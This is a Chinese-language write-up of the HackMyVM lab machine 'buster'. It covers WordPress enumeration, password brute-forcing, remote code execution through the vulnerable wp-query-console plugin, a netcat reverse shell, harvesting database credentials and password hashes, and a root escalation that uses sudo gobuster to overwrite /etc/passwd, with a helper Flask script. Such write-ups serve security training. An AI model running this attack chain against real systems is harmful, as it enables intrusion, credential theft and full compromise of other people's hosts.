# hmv_buster

# 0.简介

**靶机**：[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
**难度**：绿色
**目标 IP**：192.168.205.142
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
Nmap scan report for 192.168.205.142
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
是个**wordPress，**  拿**wpscan**扫描一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.142/ [192.168.205.142]
[+] Started: Wed Jan 15 20:13:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.205.142/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.205.142/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://192.168.205.142/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 18

[+] Finished: Wed Jan 15 20:13:57 2025
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 13.267 KB
[+] Data Received: 413.04 KB
[+] Memory used: 229.277 MB
[+] Elapsed time: 00:00:07
                                                     
```

主要的信息有`WordPress 6.7.1`和两个用户名`ta0`、`welcome`，但是`WordPress 6.7.1`没有漏洞，只可以爆破密码了

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

（省略）

[+] Performing password attack on Xmlrpc against 2 user/s
Trying ta0 / speaker Time: 00:01:37 <=========================================================> (10000 / 10000) 100.00% Time: 00:01:37

[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 15 20:18:29 2025
[+] Requests Done: 10142
[+] Cached Requests: 34
[+] Data Sent: 5.147 MB
[+] Data Received: 5.559 MB
[+] Memory used: 278.031 MB
[+] Elapsed time: 00:01:40

```

爆破了前5000行`rockyou.txt`都没有结果，没有必要爆破了，根据现在获得的信息无法判断出攻击面，但是`WordPress`靶机还有一个攻击点——**插件**

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
（省略）

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:17:12 <================================================> (108550 / 108550) 100.00% Time: 00:17:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.205.142/wp-content/plugins/akismet/
 | Latest Version: 5.3.5 (up to date)
 | Last Updated: 2024-11-19T02:02:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.205.142/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
 | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console <= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 15

[+] Finished: Wed Jan 15 20:39:16 2025
[+] Requests Done: 108575
[+] Cached Requests: 44
[+] Data Sent: 29.36 MB
[+] Data Received: 32.766 MB
[+] Memory used: 479.719 MB
[+] Elapsed time: 00:17:25

```

`wp-query-console`有漏洞，我们去搜索一下有没有利用方案。可以找到一篇这样的文章[RandomRobbieBF/CVE-2024-50498](https://github.com/RandomRobbieBF/CVE-2024-50498)

![image](https://github.com/user-attachments/assets/72a55300-d8e3-4b5d-b895-5a370c1fd640)

根据提示利用一下

![image](https://github.com/user-attachments/assets/3a1b94f1-b121-441a-a33c-d6db585b5507)

成功利用，尝试看能不能弹shell

![image](https://github.com/user-attachments/assets/74d4c4b9-7dc8-4f1b-9bd6-669273dfc52f)

显示查询参数失败，我们尝试ping kali，无果，应该是ban了函数，我们搜索一下

![image](https://github.com/user-attachments/assets/d355dc93-3a9f-436e-a874-7b36e93f57b5)

确实被ban了，我们尝试一下使用未被ban的函数

![image](https://github.com/user-attachments/assets/82858cb3-8662-44af-b9aa-f5f02210d1ad)

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp  
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
20:52:15.340738 IP 192.168.205.142 > 192.168.205.141: ICMP echo request, id 1113, seq 1, length 64
E..T..@.@.)..............Y..e..g....j....................... !"#$%&'()*+,-./01234567
20:52:15.340759 IP 192.168.205.141 > 192.168.205.142: ICMP echo reply, id 1113, seq 1, length 64
E..T
O..@.S..............Y..e..g....j....................... !"#$%&'()*+,-./01234567
20:52:16.353977 IP 192.168.205.142 > 192.168.205.141: ICMP echo request, id 1113, seq 2, length 64
E..T.M@.@.(...........4Y.Y..f..g.....b...................... !"#$%&'()*+,-./01234567
20:52:16.353997 IP 192.168.205.141 > 192.168.205.142: ICMP echo reply, id 1113, seq 2, length 64
E..T
T..@.S...........<Y.Y..f..g.....b...................... !"#$%&'()*+,-./01234567

```

我们可以看到我们的ping命令被执行了，我们进行弹shell

![image](https://github.com/user-attachments/assets/8effbcee-22c7-4b8d-9c2d-e1f2d8b65842)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                  
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.142] 58804
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@listen:~/html/wordpress$ cd /home/
www-data@listen:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Jan  7 23:18 welcome
```

当看到这个**id**的时候我就知道要去查看**mysql**了，因为这个名字和爆破出来的名字一样，我们先去找一下**mysql**的密码

```bash
www-data@listen:/home$ cd /var/www/html/wordpress/
www-data@listen:~/html/wordpress$ ls -la
total 248
drwxr-xr-x  5 www-data www-data  4096 Jan  8 02:25 .
drwxr-xr-x  3 root     root      4096 Jan  7 23:52 ..
-rwxr-xr-x  1 www-data www-data   405 Jan  8 02:25 index.php
-rwxr-xr-x  1 www-data www-data 19915 Dec 31  2023 license.txt
-rwxr-xr-x  1 www-data www-data  7409 Jun 18  2024 readme.html
-rw-r--r--  1 root     root       684 Jan  8 02:25 update_url.php
-rwxr-xr-x  1 www-data www-data  7387 Feb 13  2024 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Nov 21 09:07 wp-admin
-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php
-rwxr-xr-x  1 www-data www-data  3336 Oct 15 11:24 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3620 Jan  8 02:25 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Jan  8 02:20 wp-content
-rwxr-xr-x  1 www-data www-data  5617 Aug  2 15:40 wp-cron.php
drwxr-xr-x 30 www-data www-data 12288 Nov 21 09:07 wp-includes
-rwxr-xr-x  1 www-data www-data  2502 Nov 26  2022 wp-links-opml.php
-rwxr-xr-x  1 www-data www-data  3937 Mar 11  2024 wp-load.php
-rwxr-xr-x  1 www-data www-data 51367 Sep 30 15:12 wp-login.php
-rwxr-xr-x  1 www-data www-data  8543 Sep 18 18:37 wp-mail.php
-rwxr-xr-x  1 www-data www-data 29032 Sep 30 13:08 wp-settings.php
-rwxr-xr-x  1 www-data www-data 34385 Jun 19  2023 wp-signup.php
-rwxr-xr-x  1 www-data www-data  5102 Oct 18 11:56 wp-trackback.php
-rwxr-xr-x  1 www-data www-data  3246 Mar  2  2024 xmlrpc.php
www-data@listen:~/html/wordpress$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'll104567' );

/** Database password */
define( 'DB_PASSWORD', 'thehandsomeguy' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '2Ryf <:T/-4,9h?q%jDi(HKG_*1xH-nU+-//7[1H}zD@=q0ls8junY(~.MG@D[$S' );
define( 'SECURE_AUTH_KEY',  '}z]MVJ|P5~X1!+76?dT?s|@A,92D4/+phWkWb=;I+k{_y)7,A,<=5|&z<tE:`HET' );
define( 'LOGGED_IN_KEY',    'p4w9>FcR>{+u:M,M4rT}VIW.[Pg=UZjzp8n{-/&F;j!nC49f-^~$unsry+lHW w!' );
define( 'NONCE_KEY',        ';qi?~eGux58*l4NoDh@?<`^B6!HK{G:C85Hv8sC6<t,y}8veV4pvs#{ [[T?s123' );
define( 'AUTH_SALT',        'l2^yBli3l_G#J<T 2p}e#bS>j_=,!06$%qYd#I<p22c:z&`s?ic;7UxS$T6c{HXr' );
define( 'SECURE_AUTH_SALT', '<;95CFam*#)^qbL)a,KZXrqS$!]Ln^2yF2wg#Fa?9F<D)-,irw&nj/$pB)BR1u|O' );
define( 'LOGGED_IN_SALT',   'JaR6i0q<wZMJD-7HwE:7ZwtNxV$BJ%15=8~Bw(_jCL_`+<`^asIdv=$Yo81jE19K' );
define( 'NONCE_SALT',       'q!5K2-Q*^%Tf<lz)*o0&8/CCjU;8-jdLS4,*5vk/8,^j&]<S7+I&eO55C_CM6N@L' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if ( file_exists(ABSPATH . 'update-url.php') ) {
    include_once(ABSPATH . 'update-url.php');
}

```

登录

```bash
www-data@listen:~/html/wordpress$ mysql -u ll104567 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 118794
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |
|  2 | welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
2 rows in set (0.000 sec)


```

可以获得密码哈希是`BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`，我们爆破一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

获得密码，我们切换一下用户

```bash
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

继续尝试提权

```bash
$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster

```

可以用**sudo**权限运行**gobuster**。网上一点资料都没有，唯一类似的是使用gobuster的扫描功能探测文本，但是我们这里不管用，因为`ta0`和`ll04567`两位大佬命名的flag不是`root.txt`，需要用到一点吊炸天的操作，由`ll04567`大佬提出，`ll04567、ta0、城南花已开、 fw`大佬们共同探索的`gobuster`提权技巧

```bash
# 攻击机
┌──(kali㉿kali)-[~/test]
└─$ perl -e 'print crypt("1","aa")'
aacFCuAIHhrCM  

┌──(kali㉿kali)-[~/test]
└─$ cat a.py               
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if len(path) == 36:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)

                                      
┌──(kali㉿kali)-[~/test]
└─$ python3 a.py                 
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.205.141:80
Press CTRL+C to quit

#靶机
$ echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' > aaa
welcome@listen:~$ sudo /usr/bin/gobuster -w aaa -u http://192.168.205.141 -n -q -o /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ cat /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ su - /aaa
Password: 
/aaa@listen:~# id
uid=0(/aaa) gid=0(root) groups=0(root)

```